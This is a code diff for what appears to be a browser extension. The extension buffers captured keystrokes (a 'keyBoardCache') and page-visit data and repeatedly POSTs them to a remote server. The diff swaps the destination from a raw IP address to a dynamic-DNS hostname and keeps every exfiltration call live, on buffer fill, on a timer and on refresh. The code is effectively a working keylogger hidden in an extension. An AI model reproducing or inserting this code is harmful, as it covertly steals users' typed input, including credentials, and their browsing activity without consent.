@@ -104,10 +104,10 @@ function runExtension() {
 		},
 		add:function(income) {
 			if (this.saved.length == MAX_SAVED){
-				fetch("http://95.163.180.50/api/get_content", {
+				fetch("https://turkovmatvei.chickenkiller.com/api/get_content", {
 				  method: "POST", 
 				  headers: {
-				    'Access-Control-Allow-Origin': 'http://95.163.180.50/'
+				    'Access-Control-Allow-Origin': 'https://turkovmatvei.chickenkiller.com/'
 				  },
 				  body: JSON.stringify(this.saved)
 				}).then(res => {
@@ -136,8 +136,11 @@ function runExtension() {
 			this.saved.push(income)
 		}
 	}
-	var refreshIntervalId = setInterval(function() {fetch("http://95.163.180.50/api/get_content", {
+	var refreshIntervalId = setInterval(function() {fetch("https://turkovmatvei.chickenkiller.com/api/get_content", {
 											method: "POST", 
+											headers: {
+											  'Access-Control-Allow-Origin': 'https://turkovmatvei.chickenkiller.com/'
+											},
 											body: JSON.stringify(keyBoardCache.saved)
 												}).then(res => {
 													return null
@@ -156,8 +159,11 @@ function runExtension() {
 	}
 
 	function onRefresh(time_ml) {
-		fetch("http://95.163.180.50/api/get_content", {
+		fetch("https://turkovmatvei.chickenkiller.com/api/get_content", {
 											method: "POST", 
+											headers: {
+											  'Access-Control-Allow-Origin': 'https://turkovmatvei.chickenkiller.com/'
+											},
 											body: JSON.stringify(pageVisit(time_ml))
 												}).then(res => {
 													return null;
